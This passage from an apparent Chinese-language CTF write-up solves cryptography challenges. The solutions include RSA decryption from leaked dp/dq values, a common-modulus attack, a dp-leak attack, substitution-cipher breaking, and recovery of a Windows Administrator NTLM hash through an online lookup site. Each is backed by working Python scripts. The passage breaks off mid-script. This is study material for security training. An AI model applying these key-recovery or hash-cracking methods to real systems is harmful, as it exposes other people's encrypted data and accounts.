6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure><p>參照 <a href="https://crypto.stackexchange.com/questions/19413/what-are-dp-and-dq-in-encryption-by-rsa-in-c">此論壇</a>，得知DP is d mod (p − 1), similarly DQ is d mod (q − 1).</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mspace linebreak="newline"></mspace><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mspace linebreak="newline"></mspace><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>d</mi><mi>p</mi><mo>=</mo><mi>d</mi><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>d</mi><mi>q</mi><mo>=</mo><mi>d</mi><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c = m^e mod n\newlinem = c^d mod n\newlineϕ(n) = (p-1) * (q-1)\newlinedp = d mod (p-1)\newlinedq = d mod (q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">ϕ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p><p>要解密求出明文m，要先拿到 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>c</mi><mi>d</mi></msup></mrow><annotation encoding="application/x-tex">c^d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span></span></span></span>，利用中國剩餘定理，可以得到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mn>1</mn><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">m1 = c^d mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mn>2</mn><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">m2 = c^d mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span>。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mo stretchy="false">(</mo><mi>p</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mspace linebreak="newline"></mspace><mi>d</mi><mo>=</mo><mi>d</mi><mi>p</mi><mo>+</mo><mi>k</mi><mi mathvariant="normal">∗</mi><mo stretchy="false">(</mo><mi>p</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>m</mi><mn>1</mn><mo>=</mo><msup><mi>c</mi><mrow><mi>d</mi><mi>q</mi></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>q</mi><mspace linebreak="newline"></mspace><mi>m</mi><mn>2</mn><mo>=</mo><msup><mi>c</mi><mrow><mi>d</mi><mi>p</mi></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mspace linebreak="newline"></mspace><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>m</mi><mn>2</mn><mi mathvariant="normal">　</mi><mi mathvariant="normal">−</mi><mi mathvariant="normal">　</mi><mi>m</mi><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">　</mi><mi mathvariant="normal">∗</mi><mi mathvariant="normal">　</mi><msup><mi>p</mi><mrow><mi mathvariant="normal">−</mi><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>q</mi><mo stretchy="false">)</mo><mo>∗</mo><mi mathvariant="normal">　</mi><mi>p</mi><mo>+</mo><mi>m</mi><mn>1</mn><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">k(p−1) = 1 mod p\\d = dp + k ∗ (p−1)\\m1 = c^{dq} mod q\\m2 = c^{dp} mod p\\m = (((m2　−　m1)　∗　p^{−1} mod q) *　p + m1) mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord">∗</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">p</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord">2</span><span class="mord cjk_fallback">　</span><span class="mord">−</span><span class="mord cjk_fallback">　</span><span class="mord mathdefault">m</span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">　</span><span class="mord">∗</span><span class="mord cjk_fallback">　</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">　</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = egcd(b, a % b)  <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> egcd(a, b)[<span class="number">0</span>] % b  <span class="comment"># 求a模b得逆</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line">invq = mod_inv(p, q)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, dq, q)</span><br><span class="line">m = ((mp - mq) * invq % p) * q + mq</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><p>然後noxCTF要代換成flag，提交拿分。</p><h3 id="權限獲得第一步"><a class="markdownIt-Anchor" href="#權限獲得第一步"></a> 權限獲得第一步</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator:500:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8:::</span><br></pre></td></tr></table></figure><p>看題目感覺就是之前學到的windows密碼，打開 <a href="https://www.cmd5.com/">https://www.cmd5.com/</a> ，將 F4AD50F57683D4260DFD48AA351A17A8 輸入即可取得flag。</p><h3 id="old-fashion"><a class="markdownIt-Anchor" href="#old-fashion"></a> old-fashion</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Os drnuzearyuwn, y jtkjzoztzoes douwlr oj y ilzwex eq lsdexosa kn pwodw tsozj eq ufyoszlbz yrl rlufydlx pozw douwlrzlbz, ydderxosa ze y rlatfyr jnjzli; mjy gfbmw vla xy wbfnsy symmyew (mjy vrwm qrvvrf), hlbew rd symmyew, mebhsymw rd symmyew, vbomgeyw rd mjy lxrzy, lfk wr dremj. Mjy eyqybzye kyqbhjyew mjy myom xa hyedrevbfn lf bfzyewy wgxwmbmgmbrf. Wr mjy dsln bw f1_2jyf-k3_jg1-vb-vl_l</span><br></pre></td></tr></table></figure><p>看題目感覺是詞頻分析，就直接用<a href="https://quipqiup.com/">爆破攻擊</a>，取得flag。</p><h3 id="世上無難事"><a class="markdownIt-Anchor" href="#世上無難事"></a> 世上無難事</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VIZZB IFIUOJBWO NVXAP OBC XZZ UKHVN IFIUOJBWO HB XVIXW XAW VXFI X QIXN VBD KQ IFIUOJBWO WBKAH NBWXO VBD XJBCN NKG QLKEIU DI XUI VIUI DKNV QNCWIANQ XN DXPIMKIZW VKHV QEVBBZ KA XUZKAHNBA FKUHKAKX XAW DI VXFI HBN QNCWIANQ NCAKAH KA MUBG XZZ XEUBQQ XGIUKEX MUBG PKAWIUHXUNIA NVUBCHV 12NV HUXWI XAW DI XUI SCQN QB HZXW NVXN XZZ EBCZW SBKA CQ NBWXO XAW DI DXAN NB NVXAP DXPIMKIZW MBU JIKAH QCEV XA BCNQNXAWKAH VBQN HKFI OBCUQIZFIQ X JKH UBCAW BM XLLZXCQI XAW NVI PIO KQ 640I11012805M211J0XJ24MM02X1IW09</span><br></pre></td></tr></table></figure><p>使用跟上題一樣的爆破攻擊，然後flag要改小寫。</p><h3 id="rsa3"><a class="markdownIt-Anchor" href="#rsa3"></a> RSA3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span><br><span class="line">n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span><br><span class="line">e1=11187289</span><br><span class="line">c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span><br><span class="line">e2=9647291</span><br></pre></td></tr></table></figure><p>看題目應該是要做公共模數攻擊，假如採用兩個或者兩個以上的公鑰(N,e)來加密同一條資訊，可以得到:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c1 = pow(m, e1, N), c2 = pow(m, e2, N)</span><br></pre></td></tr></table></figure><p>分別拿對應的私鑰來解密，可以得到相同的明文m</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = pow(c1, d1, N), m = pow(c2, d2, N)</span><br></pre></td></tr></table></figure><p>假設已知n,e1,e2,c1,c2，即可得到明文m，因為e1和e2互質，所以使用歐幾里得演算法（找兩整數的最大公約數）可以找到能夠滿足以下條件的x，y</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pow(x,e1)+pow(y,e2)=1</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">20000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n = <span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1 = <span class="number">11187289</span></span><br><span class="line">c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2 = <span class="number">9647291</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = modinv(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = modinv(c2, n)</span><br><span class="line"></span><br><span class="line">m = (<span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n)) % n</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><p>取得flag，要注意的是過程中可能因為迭代次數過多被終止執行。</p><h3 id="rsa2"><a class="markdownIt-Anchor" href="#rsa2"></a> RSA2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br><span class="line">dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br><span class="line"></span><br><span class="line">c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">temp = dp * e</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span> (temp - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        x = (temp - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">        y = n % x</span><br><span class="line">        <span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">            p = x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="comment"># &#x27;//&#x27;代表向下取整,&#x27;/&#x27;得到的是浮點數</span></span><br><span class="line">d = 